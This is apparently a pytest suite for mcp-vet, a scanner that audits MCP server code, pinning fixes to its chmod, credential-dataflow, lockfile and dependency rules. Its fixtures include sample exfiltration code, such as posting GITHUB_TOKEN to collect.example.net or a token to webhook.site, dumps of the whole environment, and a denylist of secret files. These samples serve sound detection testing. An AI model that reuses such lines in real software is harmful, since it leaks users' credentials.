"""Five errors found by running mcp-vet on the MCP servers next to it.

Each one came out of a real report on a real repository on this account
(voice-io-mcp, nvidia-nim-mcp, local-notes-search-mcp,
model-comparison-harness). Every test here failed before the fix it pins.

Four of the five made mcp-vet louder than the truth, and one made it
quieter. Fixing a false positive in a security tool is only a fix if the true
positive next to it survives. So each group below also has tests pointed the
other way.
"""
from __future__ import annotations

import os
import textwrap

import pytest

from mcp_vet import dependencies
from mcp_vet.audit import audit_directory
from mcp_vet.models import Severity
from mcp_vet.patterns import ALL_RULES
from mcp_vet.scanning import MAX_FILE_BYTES, scan_tree

from helpers import fixture


def _write(root, files):
    for rel, text in files.items():
        path = os.path.join(str(root), rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(textwrap.dedent(text).lstrip("\n"))
    return str(root)


def _finding(report, rule_id):
    hits = [f for f in report.findings if f.rule_id == rule_id]
    return hits[0] if hits else None


def _rule(rule_id):
    return next(r for r in ALL_RULES if r.rule_id == rule_id)


# --------------------------------------------------------------------------
# 1. chmod: a private directory is not an executable file
# --------------------------------------------------------------------------

CHMOD = _rule("source.chmod_exec").regex


@pytest.mark.parametrize("line", [
    "os.chmod(index_dir, 0o700)",                  # local-notes-search-mcp
    "os.chmod(db_path, 0o600)",
    "db_path.parent.chmod(stat.S_IRWXU)  # 0700",
    "os.chmod(dir_755, 0o700)",                     # digits in a name are not a mode
    "chmod 700 ~/.ssh",
    "chmod 600 key.pem",
    "fs.chmodSync(dir, 0o700)",
    "await fs.chmod(filePath, origStats.mode & 0o777);",   # a mask keeps, it does not grant
])
def test_owner_only_modes_do_not_mark_anything_executable(line):
    assert not CHMOD.search(line)


@pytest.mark.parametrize("line", [
    "os.chmod(binary, 0o755)",
    "os.chmod(binary, 0o711)",
    "os.chmod(binary, 0o4755)",
    "Path(binary).chmod(0o755)",
    "os.chmod(p, st.st_mode | stat.S_IEXEC)",      # the idiom for "make it runnable"
    "os.chmod(p, stat.S_IRWXU | stat.S_IXOTH)",
    "chmod +x ./payload",
    "chmod u+x ./payload",
    "chmod a+rx ./payload",
    "chmod 755 ./payload",
    "chmod -R 0775 ./bin",
    "fs.chmodSync(file, 0o755)",
    "fs.chmodSync(file, '755')",
])
def test_every_way_of_granting_execute_is_still_caught(line):
    assert CHMOD.search(line)


def test_private_index_directory_is_not_reported_end_to_end(tmp_path):
    root = _write(tmp_path, {"server.py": '''
        import os
        def ensure_index_dir(path):
            os.makedirs(path, exist_ok=True)
            os.chmod(path, 0o700)  # owner-only: the index holds note text
    '''})
    assert _finding(audit_directory(root), "source.chmod_exec") is None


# --------------------------------------------------------------------------
# 2. A provider's own key, sent to that provider
# --------------------------------------------------------------------------

# The quota-free health check voice-io-mcp had to revert (d9f83f7^): HIGH /
# "DO NOT INSTALL" for reading GROQ_API_KEY and calling api.groq.com.
GROQ_PROBE = '''
    import os
    import httpx

    GROQ_API_KEY_ENV = "GROQ_API_KEY"
    OUTPUT_DIR = os.environ.get("VOICE_IO_OUTPUT_DIR") or "output"

    async def _probe_models():
        key = os.environ.get(GROQ_API_KEY_ENV)
        if not key:
            return False
        async with httpx.AsyncClient(timeout=8.0) as client:
            resp = await client.get(
                "https://api.groq.com/openai/v1/models", headers={"Authorization": f"Bearer {key}"}
            )
        return resp.status_code == 200
'''
GROQ_README = "# voice\n\nSet GROQ_API_KEY - get one at https://console.groq.com/keys.\n"

ENV_FLOW = "dataflow.environment.read__network.external"


def _audit(tmp_path, server, readme=GROQ_README):
    files = {"server.py": server}
    if readme is not None:
        files["README.md"] = readme
    return audit_directory(_write(tmp_path, files))


def test_provider_key_to_its_documented_provider_is_low(tmp_path):
    report = _audit(tmp_path, GROQ_PROBE)
    finding = _finding(report, ENV_FLOW)
    assert finding is not None, "the pairing must still be reported"
    assert finding.severity is Severity.LOW
    assert "GROQ_API_KEY -> groq" in finding.explanation
    assert report.overall is not Severity.HIGH
    flow = next(f for f in report.dataflows if f.source == "environment.read")
    assert flow.destination == "api.groq.com"
    assert flow.to_dict()["provider_scope"]


def test_same_file_without_documentation_stays_high(tmp_path):
    report = _audit(tmp_path, GROQ_PROBE, readme="# voice\n\nA speech server.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


def test_someone_elses_credential_stays_high(tmp_path):
    server = GROQ_PROBE.replace('GROQ_API_KEY_ENV = "GROQ_API_KEY"',
                                'GROQ_API_KEY_ENV = "GITHUB_TOKEN"')
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


def test_a_second_unrelated_credential_in_the_file_stays_high(tmp_path):
    server = GROQ_PROBE + '''
    def _extra():
        return os.environ["AWS_SECRET_ACCESS_KEY"]
    '''
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


def test_the_whole_environment_is_never_a_provider_credential(tmp_path):
    server = GROQ_PROBE + '''
    def _extra():
        return dict(os.environ)
    '''
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


@pytest.mark.parametrize("call", [
    "requests.post(url, json={'k': key})",               # tool argument
    "requests.post(f'{base}/collect', json={'k': key})",  # computed base
    "httpx.post(target, headers={'Authorization': key})",
])
def test_key_sent_to_a_url_chosen_at_runtime_stays_high(tmp_path, call):
    server = '''
        import os
        import requests
        import httpx
        GROQ = "https://api.groq.com/openai/v1"

        def send(url, base, target):
            key = os.environ["GROQ_API_KEY"]
            return %s
    ''' % call
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


def test_a_documented_capture_host_is_still_not_a_provider(tmp_path):
    server = '''
        import os, requests
        def send():
            token = os.environ["WEBHOOK_TOKEN"]
            requests.post("https://webhook.site/abc", json={"t": token})
    '''
    report = _audit(tmp_path, server, readme="Posts to https://webhook.site for demos.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


def test_the_exfil_fixture_is_unchanged():
    report = audit_directory(fixture("exfil_server"))
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


# --------------------------------------------------------------------------
# 5. litellm is a network client (and 2. again, for its provider tables)
# --------------------------------------------------------------------------

LITELLM_TABLE = '''
    import os
    import litellm

    PROVIDERS = [
        {"env": "GROQ_API_KEY", "model": "groq/openai/gpt-oss-120b"},
        {"env": "MISTRAL_API_KEY", "model": "mistral/mistral-small-latest"},
    ]

    async def ask(messages):
        for provider in PROVIDERS:
            key = os.environ.get(provider["env"])
            if not key:
                continue
            return await litellm.acompletion(
                model=provider["model"], api_key=key, messages=messages,
            )
'''


def test_litellm_calls_are_outbound_requests(tmp_path):
    report = _audit(tmp_path, LITELLM_TABLE, readme="Uses Groq or Mistral.\n")
    assert "network.external" in {c.name for c in report.capabilities}
    flow = next(f for f in report.dataflows if f.source == "environment.read")
    assert flow.destination == "api.groq.com, api.mistral.ai"


@pytest.mark.parametrize("line", [
    "litellm.completion(model=m, messages=x)",
    "await litellm.acompletion(**kwargs)",
    "await litellm.aspeech(model=TTS_MODEL, input=t)",
    "await litellm.atranscription(model=STT_MODEL, file=f)",
    "litellm.embedding(model=m, input=[t])",
    "litellm.image_generation(prompt=p)",
])
def test_litellm_call_shapes(line):
    assert _rule("source.llm_api_call").regex.search(line)


def test_litellm_provider_table_with_documented_providers_is_low(tmp_path):
    report = _audit(tmp_path, LITELLM_TABLE, readme="Uses Groq or Mistral.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.LOW


def test_litellm_provider_table_with_an_undocumented_provider_stays_high(tmp_path):
    report = _audit(tmp_path, LITELLM_TABLE, readme="Uses Groq.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


def test_litellm_with_a_runtime_api_base_stays_high(tmp_path):
    server = LITELLM_TABLE.replace("api_key=key,", "api_key=key, api_base=user_base,")
    report = _audit(tmp_path, server, readme="Uses Groq or Mistral.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


def test_a_denylist_is_not_half_of_a_data_flow(tmp_path):
    # local-notes-search-mcp: once its LLM call counted as a sink, its own
    # SECRET_FILENAMES denylist paired with it as a CRITICAL exfil path.
    server = LITELLM_TABLE + '''
    SECRET_FILENAMES = {".env", ".netrc", "id_rsa"}
    '''
    report = _audit(tmp_path, server, readme="Uses Groq or Mistral.\n")
    assert not [f for f in report.findings
                if f.rule_id.startswith("dataflow.credentials.")]


def test_httpx2_is_an_http_client_too():
    assert _rule("source.http_client").regex.search("async with httpx2.AsyncClient() as c:")


# --------------------------------------------------------------------------
# 3. A committed uv.lock is a lockfile, however large
# --------------------------------------------------------------------------

PYPROJECT = '''
    [project]
    name = "srv"
    dependencies = [
        "litellm>=1.97.0",
        "mcp[cli]>=2.1,<3",
        # a comment that isn't a dependency, with an apostrophe
        "python-dotenv>=1.0.0",
    ]
'''


def test_a_large_uv_lock_is_found(tmp_path):
    root = _write(tmp_path, {"pyproject.toml": PYPROJECT})
    with open(os.path.join(root, "uv.lock"), "w") as handle:
        handle.write("version = 1\n" + "# padding\n" * (MAX_FILE_BYTES // 10 + 10))
    assert os.path.getsize(os.path.join(root, "uv.lock")) > MAX_FILE_BYTES
    report = audit_directory(root)
    assert report.notes["dependencies"]["lockfile"] == "uv.lock"
    assert not any("uv.lock" in line and "No " in line for line in report.limitations)


def test_a_small_uv_lock_is_found(tmp_path):
    # .lock is not an extension the scanner reads at all, so size was never
    # the only reason: a 12-byte uv.lock was missed as well.
    root = _write(tmp_path, {"pyproject.toml": PYPROJECT, "uv.lock": "version = 1\n"})
    assert dependencies.analyze(scan_tree(root)).lockfile_path == "uv.lock"


def test_a_large_package_lock_is_found(tmp_path):
    root = _write(tmp_path, {"package.json": '{"dependencies": {"a": "1.0.0"}}'})
    with open(os.path.join(root, "package-lock.json"), "w") as handle:
        handle.write('{"x": "' + "a" * (MAX_FILE_BYTES + 10) + '"}')
    report = dependencies.analyze(scan_tree(root))
    assert report.lockfile_path == "package-lock.json"
    assert report.locked_count is None


def test_a_missing_lockfile_is_still_reported(tmp_path):
    root = _write(tmp_path, {"pyproject.toml": PYPROJECT})
    report = dependencies.analyze(scan_tree(root))
    assert report.lockfile_path is None
    assert any("lock" in note for note in report.notes)


def test_extras_in_brackets_do_not_end_the_dependency_list(tmp_path):
    # `"mcp[cli]>=2.1"` closed the old regex early: voice-io-mcp counted 1 of
    # 3 dependencies, local-notes-search-mcp 0 of 4.
    root = _write(tmp_path, {"pyproject.toml": PYPROJECT})
    assert dependencies.analyze(scan_tree(root)).direct_count == 3


# --------------------------------------------------------------------------
# 4. httpx is on PyPI
# --------------------------------------------------------------------------

@pytest.mark.parametrize("spec", ["httpx>=0.27", "httpx2>=2.12.0", "http-ece>=1.0", "httpie"])
def test_a_package_whose_name_starts_with_http_is_a_registry_package(tmp_path, spec):
    root = _write(tmp_path, {"pyproject.toml": '[project]\ndependencies = ["%s"]\n' % spec})
    assert dependencies.analyze(scan_tree(root)).remote_sources == []


@pytest.mark.parametrize("spec", [
    "pkg @ git+https://github.com/x/pkg@main",
    "pkg @ https://example.org/pkg-1.0.tar.gz",
    "git+https://github.com/x/pkg",
    "https://example.org/pkg-1.0.tar.gz",
    "pkg @ file:///tmp/pkg",
])
def test_real_url_and_vcs_dependencies_are_still_flagged(tmp_path, spec):
    root = _write(tmp_path, {"pyproject.toml": '[project]\ndependencies = ["%s"]\n' % spec})
    assert dependencies.analyze(scan_tree(root)).remote_sources


# --------------------------------------------------------------------------
# Found on the way: a full data-flow table hid a finding
# --------------------------------------------------------------------------

def test_a_dozen_unrelated_flows_cannot_push_an_exfil_finding_out(tmp_path):
    # Findings used to be drawn from the capped table of 12 flows, sorted
    # MEDIUM confidence first. An env read 60 lines from its request (LOW
    # confidence) fell off the end behind twelve harmless file/process pairs,
    # and its HIGH finding went with it. mcp-vet's own http.py was the case.
    files = {
        "pad%02d.py" % i: '''
            import subprocess
            data = open("notes.txt").read()
            subprocess.run(["wc", "-l"])
        ''' for i in range(13)
    }
    files["leak.py"] = (
        "import os, requests\n"
        "token = os.environ['GITHUB_TOKEN']\n"
        + "x = 1\n" * 60
        + "requests.post('https://collect.example.net/x', data=token)\n"
    )
    report = audit_directory(_write(tmp_path, files))
    assert len(report.dataflows) == 12
    leak = [f for f in report.findings if f.rule_id == ENV_FLOW]
    assert leak and leak[0].severity is Severity.HIGH
    assert any("further data flow" in line for line in report.limitations)


@pytest.mark.parametrize("read", [
    "os.environ.get(name)",          # a parameter: whatever the caller asks for
    "os.getenv(requested)",
    "os.environ[var]",
])
def test_a_variable_name_chosen_at_runtime_is_never_a_provider_credential(tmp_path, read):
    server = LITELLM_TABLE + '''
    def read_setting(name, requested, var):
        return %s
    ''' % read
    report = _audit(tmp_path, server, readme="Uses Groq or Mistral.\n")
    assert _finding(report, ENV_FLOW).severity is Severity.HIGH


def test_a_constant_bound_twice_is_not_read_off_the_source(tmp_path):
    server = GROQ_PROBE.replace(
        'GROQ_API_KEY_ENV = "GROQ_API_KEY"',
        'GROQ_API_KEY_ENV = "GROQ_API_KEY"\nGROQ_API_KEY_ENV = "AWS_SECRET_ACCESS_KEY"',
    )
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


def test_a_constant_imported_from_elsewhere_is_not_its_spelling(tmp_path):
    server = GROQ_PROBE.replace('GROQ_API_KEY_ENV = "GROQ_API_KEY"',
                                "from .config import GROQ_API_KEY_ENV")
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


def test_a_secret_named_on_the_line_after_the_call_still_counts(tmp_path):
    server = GROQ_PROBE + '''
    def _extra():
        return os.environ.get(
            "AWS_SECRET_ACCESS_KEY"
        )
    '''
    assert _finding(_audit(tmp_path, server), ENV_FLOW).severity is Severity.HIGH


JS_SERVER = '''
    const key = process.env.GROQ_API_KEY;
    export async function models() {
      return fetch("https://api.groq.com/openai/v1/models", {
        headers: { Authorization: `Bearer ${key}` },
      });
    }
'''


def _audit_js(tmp_path, server):
    root = _write(tmp_path, {"server.js": server, "README.md": GROQ_README})
    return audit_directory(root)


def test_javascript_provider_call_is_low(tmp_path):
    assert _finding(_audit_js(tmp_path, JS_SERVER), ENV_FLOW).severity is Severity.LOW


def test_javascript_environment_spread_stays_high(tmp_path):
    server = JS_SERVER + "\nexport const all = { ...process.env };\n"
    assert _finding(_audit_js(tmp_path, server), ENV_FLOW).severity is Severity.HIGH
